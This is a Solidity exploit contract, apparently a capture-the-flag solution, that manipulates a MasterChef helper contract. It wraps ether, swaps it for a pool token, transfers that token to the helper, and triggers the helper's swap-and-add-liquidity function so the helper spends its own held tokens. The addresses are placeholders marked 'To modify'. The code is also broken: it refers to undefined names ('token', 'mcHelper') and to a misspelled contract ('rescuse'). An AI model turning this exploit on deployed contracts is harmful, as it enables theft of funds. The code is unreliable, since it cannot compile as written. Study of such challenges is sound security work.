// SPDX-License-Identifier: GNU AGPLv3

pragma solidity ^0.8.10;
import "./UniswapV2Like.sol";

interface ERC20Like {
    function transferFrom(
        address,
        address,
        uint256
    ) external;

    function transfer(address, uint256) external;

    function approve(address, uint256) external;

    function balanceOf(address) external view returns (uint256);
}

interface WETH9 is ERC20Like {
    function deposit() external payable;
}

interface MasterChefLike {
    function poolInfo(uint256 id)
        external
        returns (
            address lpToken,
            uint256 allocPoint,
            uint256 lastRewardBlock,
            uint256 accSushiPerShare
        );
}

interface IMasterChefHelper {
    function swapTokenForPoolToken(
        uint256 poolId,
        address tokenIn,
        uint256 amountIn,
        uint256 minAmountOut
    ) external;
}

interface ISetup {
    function mcHelper() external returns (address);
}

contract rescue {
    WETH9 public constant weth = WETH9(address(0x0)); // To modify;
    MasterChefLike public constant masterchef = MasterChefLike(address(0x0)); // To modify;
    UniswapV2RouterLike public constant router =
        UniswapV2RouterLike(address(0x0)); // To modify;
    ISetup setup = ISetup(address(0x0)); // To modify;

    function main() public payable returns (uint256) {
        require(msg.value > 10 ether, "need more than 10 ether");

        IMasterChefHelper mc = IMasterChefHelper(address(setup.mcHelper()));

        //first 2 pools are against weth
        //lets find our tokenA and tokenB
        uint256 poolId1 = 1;
        uint256 poolId2 = 2;
        (address lpToken1, , , ) = masterchef.poolInfo(poolId1);
        address token0 = UniswapV2PairLike(lpToken1).token0();
        address token1 = UniswapV2PairLike(lpToken1).token1();
        address tokenA;
        (token0 == address(weth)) ? tokenA = token1 : tokenA = token0;

        (address lpToken2, , , ) = masterchef.poolInfo(poolId2);
        token0 = UniswapV2PairLike(lpToken2).token0();
        token1 = UniswapV2PairLike(lpToken2).token1();
        address tokenB;
        (token0 == address(weth)) ? tokenB = token1 : tokenB = token0;

        //now we want some weth to trade for tokenA
        weth.deposit{value: msg.value}();

        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = tokenA;

        ERC20Like(weth).approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            msg.value - 1 gwei,
            0,
            path,
            address(this),
            block.timestamp
        );

        //and we transfer them to the mcHelper
        ERC20Like(token).transfer(
            address(mcHelper),
            ERC20Like(token).balanceOf(address(this))
        );

        //now we want some tokenB to trigger the action of adding liquidity
        path[1] = tokenB;
        router.swapExactTokensForTokens(
            1 gwei,
            0,
            path,
            address(this),
            block.timestamp
        );

        //trigger
        ERC20Like(tokenB).approve(address(mcHelper), type(uint256).max);
        mc.swapTokenForPoolToken(
            poolId1,
            address(tokenB),
            ERC20Like(tokenB).balanceOf(address(this)),
            0
        );
    }
}

contract start {
    constructor() payable {
        rescuse r = new rescuse();
        r.main{value: msg.value}();
    }
}
